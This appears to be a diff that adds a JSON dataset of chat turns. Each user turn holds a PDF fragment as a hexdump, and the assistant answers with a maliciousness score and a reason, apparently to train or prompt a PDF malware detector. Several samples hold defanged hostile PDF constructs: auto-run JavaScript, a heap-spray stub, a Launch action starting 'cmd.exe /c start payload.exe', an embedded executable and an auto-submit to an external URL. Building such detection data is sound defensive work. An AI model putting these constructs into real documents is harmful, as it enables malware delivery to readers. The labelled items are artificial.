@@ -1,0 +1,98 @@
+[
+  {
+    "role": "user",
+    "content": "Meta: size=512B  triggers=none\n\nHexdump:\n00000000  25 50 44 46 2d 31 2e 37 0a 31 20 30 20 6f 62 6a  |%PDF-1.7.1 0 obj|\n00000010  0a 3c 3c 20 2f 54 79 70 65 20 2f 43 61 74 61 6c  |.<< /Type /Catal|\n00000020  6f 67 20 2f 50 61 67 65 73 20 32 20 30 20 52 20  |og /Pages 2 0 R |\n00000030  3e 3e 0a 65 6e 64 6f 62 6a 0a 32 20 30 20 6f 62  |>>.endobj.2 0 ob|\n00000040  6a 0a 3c 3c 20 2f 54 79 70 65 20 2f 50 61 67 65  |j.<< /Type /Page|\n00000050  73 20 2f 43 6f 75 6e 74 20 31 20 2f 4b 69 64 73  |s /Count 1 /Kids|\n00000060  20 5b 33 20 30 20 52 5d 20 3e 3e 0a 65 6e 64 6f  | [3 0 R] >>.endo|\n00000070  62 6a 0a 33 20 30 20 6f 62 6a 0a 3c 3c 20 2f 54  |bj.3 0 obj.<< /T|\n00000080  79 70 65 20 2f 50 61 67 65 20 2f 50 61 72 65 6e  |ype /Page /Paren|\n00000090  74 20 32 20 30 20 52 20 2f 52 65 73 6f 75 72 63  |t 2 0 R /Resourc|\n000000a0  65 73 20 3c 3c 20 2f 46 6f 6e 74 20 3c 3c 20 2f  |es << /Font << /|\n000000b0  46 31 20 34 20 30 20 52 20 3e 3e 20 3e 3e 20 2f  |F1 4 0 R >> >> /|\n000000c0  43 6f 6e 74 65 6e 74 73 20 35 20 30 20 52 20 3e  |Contents 5 0 R >|\n000000d0  3e 0a 65 6e 64 6f 62 6a 0a                       |>.endobj.|"
+  },
+  {
+    "role": "assistant",
+    "content": "0.02 – normal PDF catalog/page tree structure, no script/action/embed indicators"
+  },
+  {
+    "role": "user",
+    "content": "Meta: size=1840B  triggers=none\n\nHexdump:\n00000000  35 20 30 20 6f 62 6a 0a 3c 3c 20 2f 4c 65 6e 67  |5 0 obj.<< /Leng|\n00000010  74 68 20 36 38 20 2f 46 69 6c 74 65 72 20 2f 46  |th 68 /Filter /F|\n00000020  6c 61 74 65 44 65 63 6f 64 65 20 3e 3e 0a 73 74  |lateDecode >>.st|\n00000030  72 65 61 6d 0a 78 5c 78 39 63 2b 54 30 5c 78 30  |ream.x\\x9c+T0\\x0|\n00000040  30 42 43 5c 78 38 35 5c 78 39 32 44 5c 78 30 35  |0BC\\x85\\x92D\\x05|\n00000050  20 43 5c 78 30 35 5c 78 31 33 5c 78 38 35 5c 78  | C\\x05\\x13\\x85\\x|\n00000060  39 30 5c 78 31 34 2e 5c 78 31 30 5c 78 30 30 5c  |90\\x14.\\x10\\x00\\|\n00000070  78 31 38 5c 78 38 62 5c 78 30 33 5c 78 64 31 0a  |x18\\x8b\\x03\\xd1.|\n00000080  65 6e 64 73 74 72 65 61 6d 0a 65 6e 64 6f 62 6a  |endstream.endobj|\n00000090  0a                                               |.|"
+  },
+  {
+    "role": "assistant",
+    "content": "0.08 – ordinary compressed content stream; FlateDecode alone is common and weak evidence"
+  },
+  {
+    "role": "user",
+    "content": "Meta: size=2140B  triggers=none\n\nHexdump:\n00000000  38 20 30 20 6f 62 6a 0a 3c 3c 20 2f 54 79 70 65  |8 0 obj.<< /Type|\n00000010  20 2f 41 6e 6e 6f 74 20 2f 53 75 62 74 79 70 65  | /Annot /Subtype|\n00000020  20 2f 4c 69 6e 6b 20 2f 52 65 63 74 20 5b 37 32  | /Link /Rect [72|\n00000030  20 37 32 30 20 31 34 34 20 37 34 34 5d 20 2f 42  | 720 144 744] /B|\n00000040  6f 72 64 65 72 20 5b 30 20 30 20 30 5d 0a 20 20  |order [0 0 0].  |\n00000050  20 2f 41 20 3c 3c 20 2f 53 20 2f 55 52 49 20 2f  | /A << /S /URI /|\n00000060  55 52 49 20 28 68 74 74 70 73 3a 2f 2f 65 78 61  |URI (https://exa|\n00000070  6d 70 6c 65 2e 6f 72 67 2f 68 65 6c 70 29 20 3e  |mple.org/help) >|\n00000080  3e 20 3e 3e 0a 65 6e 64 6f 62 6a 0a              |> >>.endobj.|"
+  },
+  {
+    "role": "assistant",
+    "content": "0.18 – external URI link can be abused for phishing but this benign-looking link has no auto-execution"
+  },
+  {
+    "role": "user",
+    "content": "Meta: size=3620B  triggers=key:/AcroForm\n\nHexdump:\n00000000  31 30 20 30 20 6f 62 6a 0a 3c 3c 20 2f 41 63 72  |10 0 obj.<< /Acr|\n00000010  6f 46 6f 72 6d 20 3c 3c 20 2f 46 69 65 6c 64 73  |oForm << /Fields|\n00000020  20 5b 31 31 20 30 20 52 5d 20 3e 3e 20 3e 3e 0a  | [11 0 R] >> >>.|\n00000030  65 6e 64 6f 62 6a 0a 31 31 20 30 20 6f 62 6a 0a  |endobj.11 0 obj.|\n00000040  3c 3c 20 2f 46 54 20 2f 54 78 20 2f 54 20 28 4e  |<< /FT /Tx /T (N|\n00000050  61 6d 65 29 20 2f 56 20 28 29 20 2f 52 65 63 74  |ame) /V () /Rect|\n00000060  20 5b 31 30 30 20 36 30 30 20 32 36 30 20 36 32  | [100 600 260 62|\n00000070  30 5d 20 3e 3e 0a 65 6e 64 6f 62 6a 0a           |0] >>.endobj.|"
+  },
+  {
+    "role": "assistant",
+    "content": "0.12 – simple AcroForm text field; forms are not malware without JavaScript or dangerous actions"
+  },
+  {
+    "role": "user",
+    "content": "Meta: size=58000B  triggers=none\n\nHexdump:\n00000000  31 39 20 30 20 6f 62 6a 0a 3c 3c 20 2f 4c 65 6e  |19 0 obj.<< /Len|\n00000010  67 74 68 20 35 34 32 31 31 20 2f 46 69 6c 74 65  |gth 54211 /Filte|\n00000020  72 20 2f 46 6c 61 74 65 44 65 63 6f 64 65 20 3e  |r /FlateDecode >|\n00000030  3e 0a 73 74 72 65 61 6d 0a 37 66 20 32 63 20 39  |>.stream.7f 2c 9|\n00000040  31 20 61 64 20 65 34 20 34 32 20 30 36 20 64 31  |1 ad e4 42 06 d1|\n00000050  20 38 38 20 39 61 20 35 65 20 34 61 20 31 32 20  | 88 9a 5e 4a 12 |\n00000060  30 63 20 66 66 20 38 31 0a 61 62 20 30 64 20 36  |0c ff 81.ab 0d 6|\n00000070  36 20 39 65 20 32 62 20 34 31 20 37 37 20 31 30  |6 9e 2b 41 77 10|\n00000080  20 30 33 20 64 32 20 65 61 20 36 32 20 35 35 20  | 03 d2 ea 62 55 |\n00000090  63 30 20 38 63 20 31 66 0a 65 6e 64 73 74 72 65  |c0 8c 1f.endstre|\n000000a0  61 6d 0a 65 6e 64 6f 62 6a 0a                    |am.endobj.|"
+  },
+  {
+    "role": "assistant",
+    "content": "0.22 – large compressed or random-looking stream, but no triggers, scripts, launch actions, or embedded payload markers"
+  },
+  {
+    "role": "user",
+    "content": "Meta: size=980B  triggers=key:/OpenAction,key:/JavaScript,key:/JS\n\nHexdump:\n00000000  31 20 30 20 6f 62 6a 0a 3c 3c 20 2f 54 79 70 65  |1 0 obj.<< /Type|\n00000010  20 2f 43 61 74 61 6c 6f 67 20 2f 4f 70 65 6e 41  | /Catalog /OpenA|\n00000020  63 74 69 6f 6e 20 32 20 30 20 52 20 3e 3e 0a 65  |ction 2 0 R >>.e|\n00000030  6e 64 6f 62 6a 0a 32 20 30 20 6f 62 6a 0a 3c 3c  |ndobj.2 0 obj.<<|\n00000040  20 2f 53 20 2f 4a 61 76 61 53 63 72 69 70 74 20  | /S /JavaScript |\n00000050  2f 4a 53 20 28 61 70 70 2e 61 6c 65 72 74 28 27  |/JS (app.alert('|\n00000060  6c 6f 61 64 69 6e 67 20 64 6f 63 75 6d 65 6e 74  |loading document|\n00000070  27 29 29 20 3e 3e 0a 65 6e 64 6f 62 6a 0a        |')) >>.endobj.|"
+  },
+  {
+    "role": "assistant",
+    "content": "0.82 – OpenAction auto-runs JavaScript on document open, a common malicious PDF pattern"
+  },
+  {
+    "role": "user",
+    "content": "Meta: size=1710B  triggers=key:/AA,key:/JS,key:/JavaScript\n\nHexdump:\n00000000  37 20 30 20 6f 62 6a 0a 3c 3c 20 2f 54 79 70 65  |7 0 obj.<< /Type|\n00000010  20 2f 41 6e 6e 6f 74 20 2f 53 75 62 74 79 70 65  | /Annot /Subtype|\n00000020  20 2f 57 69 64 67 65 74 20 2f 41 41 20 3c 3c 20  | /Widget /AA << |\n00000030  2f 45 20 38 20 30 20 52 20 2f 46 6f 20 38 20 30  |/E 8 0 R /Fo 8 0|\n00000040  20 52 20 3e 3e 20 3e 3e 0a 65 6e 64 6f 62 6a 0a  | R >> >>.endobj.|\n00000050  38 20 30 20 6f 62 6a 0a 3c 3c 20 2f 53 20 2f 4a  |8 0 obj.<< /S /J|\n00000060  61 76 61 53 63 72 69 70 74 20 2f 4a 53 20 28 76  |avaScript /JS (v|\n00000070  61 72 20 73 3d 75 6e 65 73 63 61 70 65 28 27 25  |ar s=unescape('%|\n00000080  75 39 30 39 30 25 75 39 30 39 30 27 29 3b 20 77  |u9090%u9090'); w|\n00000090  68 69 6c 65 28 73 2e 6c 65 6e 67 74 68 3c 34 30  |hile(s.length<40|\n000000a0  39 36 29 73 2b 3d 73 3b 29 20 3e 3e 0a 65 6e 64  |96)s+=s;) >>.end|\n000000b0  6f 62 6a 0a                                      |obj.|"
+  },
+  {
+    "role": "assistant",
+    "content": "0.93 – additional-action JavaScript with heap-spray style unescape/NOP pattern is strongly malicious"
+  },
+  {
+    "role": "user",
+    "content": "Meta: size=1340B  triggers=key:/Launch\n\nHexdump:\n00000000  34 20 30 20 6f 62 6a 0a 3c 3c 20 2f 54 79 70 65  |4 0 obj.<< /Type|\n00000010  20 2f 41 63 74 69 6f 6e 20 2f 53 20 2f 4c 61 75  | /Action /S /Lau|\n00000020  6e 63 68 20 2f 46 20 28 63 6d 64 2e 65 78 65 29  |nch /F (cmd.exe)|\n00000030  0a 20 20 20 2f 57 69 6e 20 3c 3c 20 2f 46 20 28  |.   /Win << /F (|\n00000040  63 6d 64 2e 65 78 65 29 20 2f 50 20 28 2f 63 20  |cmd.exe) /P (/c |\n00000050  73 74 61 72 74 20 70 61 79 6c 6f 61 64 2e 65 78  |start payload.ex|\n00000060  65 29 20 3e 3e 20 3e 3e 0a 65 6e 64 6f 62 6a 0a  |e) >> >>.endobj.|"
+  },
+  {
+    "role": "assistant",
+    "content": "0.96 – Launch action attempts to start an external command or executable"
+  },
+  {
+    "role": "user",
+    "content": "Meta: size=3860B  triggers=key:/EmbeddedFile,key:/Filespec,key:/Names\n\nHexdump:\n00000000  31 32 20 30 20 6f 62 6a 0a 3c 3c 20 2f 54 79 70  |12 0 obj.<< /Typ|\n00000010  65 20 2f 43 61 74 61 6c 6f 67 20 2f 4e 61 6d 65  |e /Catalog /Name|\n00000020  73 20 3c 3c 20 2f 45 6d 62 65 64 64 65 64 46 69  |s << /EmbeddedFi|\n00000030  6c 65 73 20 3c 3c 20 2f 4e 61 6d 65 73 20 5b 28  |les << /Names [(|\n00000040  69 6e 76 6f 69 63 65 2e 65 78 65 29 20 31 33 20  |invoice.exe) 13 |\n00000050  30 20 52 5d 20 3e 3e 20 3e 3e 20 3e 3e 0a 65 6e  |0 R] >> >> >>.en|\n00000060  64 6f 62 6a 0a 31 33 20 30 20 6f 62 6a 0a 3c 3c  |dobj.13 0 obj.<<|\n00000070  20 2f 54 79 70 65 20 2f 46 69 6c 65 73 70 65 63  | /Type /Filespec|\n00000080  20 2f 46 20 28 69 6e 76 6f 69 63 65 2e 65 78 65  | /F (invoice.exe|\n00000090  29 20 2f 45 46 20 3c 3c 20 2f 46 20 31 34 20 30  |) /EF << /F 14 0|\n000000a0  20 52 20 3e 3e 20 3e 3e 0a 65 6e 64 6f 62 6a 0a  | R >> >>.endobj.|\n000000b0  31 34 20 30 20 6f 62 6a 0a 3c 3c 20 2f 54 79 70  |14 0 obj.<< /Typ|\n000000c0  65 20 2f 45 6d 62 65 64 64 65 64 46 69 6c 65 20  |e /EmbeddedFile |\n000000d0  2f 53 75 62 74 79 70 65 20 2f 61 70 70 6c 69 63  |/Subtype /applic|\n000000e0  61 74 69 6f 6e 23 32 46 78 2d 6d 73 64 6f 77 6e  |ation#2Fx-msdown|\n000000f0  6c 6f 61 64 20 2f 4c 65 6e 67 74 68 20 36 34 20  |load /Length 64 |\n00000100  3e 3e 0a 73 74 72 65 61 6d 0a 4d 5a 5c 78 39 30  |>>.stream.MZ\\x90|\n00000110  5c 78 30 30 5c 78 30 33 5c 78 30 30 5c 78 30 30  |\\x00\\x03\\x00\\x00|\n00000120  5c 78 30 30 54 68 69 73 20 70 72 6f 67 72 61 6d  |\\x00This program|\n00000130  20 63 61 6e 6e 6f 74 20 62 65 20 72 75 6e 20 69  | cannot be run i|\n00000140  6e 20 44 4f 53 20 6d 6f 64 65 0a 65 6e 64 73 74  |n DOS mode.endst|\n00000150  72 65 61 6d 0a 65 6e 64 6f 62 6a 0a              |ream.endobj.|"
+  },
+  {
+    "role": "assistant",
+    "content": "0.95 – embedded executable Filespec with MZ/PE marker is a strong malware indicator"
+  },
+  {
+    "role": "user",
+    "content": "Meta: size=2420B  triggers=key:/OpenAction,key:/SubmitForm,key:/URI\n\nHexdump:\n00000000  33 20 30 20 6f 62 6a 0a 3c 3c 20 2f 54 79 70 65  |3 0 obj.<< /Type|\n00000010  20 2f 43 61 74 61 6c 6f 67 20 2f 4f 70 65 6e 41  | /Catalog /OpenA|\n00000020  63 74 69 6f 6e 20 36 20 30 20 52 20 3e 3e 0a 65  |ction 6 0 R >>.e|\n00000030  6e 64 6f 62 6a 0a 36 20 30 20 6f 62 6a 0a 3c 3c  |ndobj.6 0 obj.<<|\n00000040  20 2f 53 20 2f 53 75 62 6d 69 74 46 6f 72 6d 20  | /S /SubmitForm |\n00000050  2f 46 20 3c 3c 20 2f 46 53 20 2f 55 52 4c 20 2f  |/F << /FS /URL /|\n00000060  46 20 28 68 74 74 70 3a 2f 2f 65 78 61 6d 70 6c  |F (http://exampl|\n00000070  65 2e 69 6e 76 61 6c 69 64 2f 63 6f 6c 6c 65 63  |e.invalid/collec|\n00000080  74 29 20 3e 3e 20 2f 46 6c 61 67 73 20 34 20 3e  |t) >> /Flags 4 >|\n00000090  3e 0a 65 6e 64 6f 62 6a 0a                       |>.endobj.|"
+  },
+  {
+    "role": "assistant",
+    "content": "0.78 – OpenAction submits data to an external URL on open; suspicious exfiltration/phishing behavior"
+  },
+  {
+    "role": "user",
+    "content": "Meta: size=4200B  triggers=key:/XFA,key:/JavaScript\n\nHexdump:\n00000000  32 31 20 30 20 6f 62 6a 0a 3c 3c 20 2f 41 63 72  |21 0 obj.<< /Acr|\n00000010  6f 46 6f 72 6d 20 3c 3c 20 2f 58 46 41 20 32 32  |oForm << /XFA 22|\n00000020  20 30 20 52 20 3e 3e 20 3e 3e 0a 65 6e 64 6f 62  | 0 R >> >>.endob|\n00000030  6a 0a 32 32 20 30 20 6f 62 6a 0a 3c 3c 20 2f 4c  |j.22 0 obj.<< /L|\n00000040  65 6e 67 74 68 20 31 38 30 20 3e 3e 0a 73 74 72  |ength 180 >>.str|\n00000050  65 61 6d 0a 3c 78 64 70 3a 78 64 70 3e 3c 74 65  |eam.<xdp:xdp><te|\n00000060  6d 70 6c 61 74 65 3e 3c 65 76 65 6e 74 20 61 63  |mplate><event ac|\n00000070  74 69 76 69 74 79 3d 22 64 6f 63 52 65 61 64 79  |tivity=\"docReady|\n00000080  22 3e 3c 73 63 72 69 70 74 20 63 6f 6e 74 65 6e  |\"><script conten|\n00000090  74 54 79 70 65 3d 22 61 70 70 6c 69 63 61 74 69  |tType=\"applicati|\n000000a0  6f 6e 2f 78 2d 6a 61 76 61 73 63 72 69 70 74 22  |on/x-javascript\"|\n000000b0  3e 65 76 61 6c 28 75 6e 65 73 63 61 70 65 28 27  |>eval(unescape('|\n000000c0  25 37 35 25 37 32 25 36 63 27 29 29 3b 3c 2f 73  |%75%72%6c'));</s|\n000000d0  63 72 69 70 74 3e 3c 2f 65 76 65 6e 74 3e 3c 2f  |cript></event></|\n000000e0  74 65 6d 70 6c 61 74 65 3e 3c 2f 78 64 70 3a 78  |template></xdp:x|\n000000f0  64 70 3e 0a 65 6e 64 73 74 72 65 61 6d 0a 65 6e  |dp>.endstream.en|\n00000100  64 6f 62 6a 0a                                   |dobj.|"
+  },
+  {
+    "role": "assistant",
+    "content": "0.88 – XFA docReady JavaScript with eval/unescape obfuscation is a common malicious-PDF technique"
+  },
+  {
+    "role": "user",
+    "content": "Meta: size=5310B  triggers=key:/RichMedia,key:/EmbeddedFile\n\nHexdump:\n00000000  33 30 20 30 20 6f 62 6a 0a 3c 3c 20 2f 53 75 62  |30 0 obj.<< /Sub|\n00000010  74 79 70 65 20 2f 52 69 63 68 4d 65 64 69 61 20  |type /RichMedia |\n00000020  2f 52 69 63 68 4d 65 64 69 61 43 6f 6e 74 65 6e  |/RichMediaConten|\n00000030  74 20 3c 3c 20 2f 41 73 73 65 74 73 20 3c 3c 20  |t << /Assets << |\n00000040  2f 4e 61 6d 65 73 20 5b 28 6d 6f 76 69 65 2e 73  |/Names [(movie.s|\n00000050  77 66 29 20 33 31 20 30 20 52 5d 20 3e 3e 20 3e  |wf) 31 0 R] >> >|\n00000060  3e 20 3e 3e 0a 65 6e 64 6f 62 6a 0a 33 31 20 30  |> >>.endobj.31 0|\n00000070  20 6f 62 6a 0a 3c 3c 20 2f 54 79 70 65 20 2f 46  | obj.<< /Type /F|\n00000080  69 6c 65 73 70 65 63 20 2f 46 20 28 6d 6f 76 69  |ilespec /F (movi|\n00000090  65 2e 73 77 66 29 20 2f 45 46 20 3c 3c 20 2f 46  |e.swf) /EF << /F|\n000000a0  20 33 32 20 30 20 52 20 3e 3e 20 3e 3e 0a 65 6e  | 32 0 R >> >>.en|\n000000b0  64 6f 62 6a 0a 33 32 20 30 20 6f 62 6a 0a 3c 3c  |dobj.32 0 obj.<<|\n000000c0  20 2f 54 79 70 65 20 2f 45 6d 62 65 64 64 65 64  | /Type /Embedded|\n000000d0  46 69 6c 65 20 2f 53 75 62 74 79 70 65 20 2f 61  |File /Subtype /a|\n000000e0  70 70 6c 69 63 61 74 69 6f 6e 23 32 46 78 2d 73  |pplication#2Fx-s|\n000000f0  68 6f 63 6b 77 61 76 65 2d 66 6c 61 73 68 20 2f  |hockwave-flash /|\n00000100  4c 65 6e 67 74 68 20 38 30 20 3e 3e 0a 73 74 72  |Length 80 >>.str|\n00000110  65 61 6d 0a 46 57 53 5c 78 30 39 5c 78 30 30 5c  |eam.FWS\\x09\\x00\\|\n00000120  78 30 30 5c 78 30 30 5c 78 30 30 41 63 74 69 6f  |x00\\x00\\x00Actio|\n00000130  6e 53 63 72 69 70 74 20 73 68 65 6c 6c 63 6f 64  |nScript shellcod|\n00000140  65 20 70 6c 61 63 65 68 6f 6c 64 65 72 0a 65 6e  |e placeholder.en|\n00000150  64 73 74 72 65 61 6d 0a 65 6e 64 6f 62 6a 0a     |dstream.endobj.|"
+  },
+  {
+    "role": "assistant",
+    "content": "0.84 – RichMedia with embedded Flash/SWF is risky and historically used for PDF exploit delivery"
+  }
+]
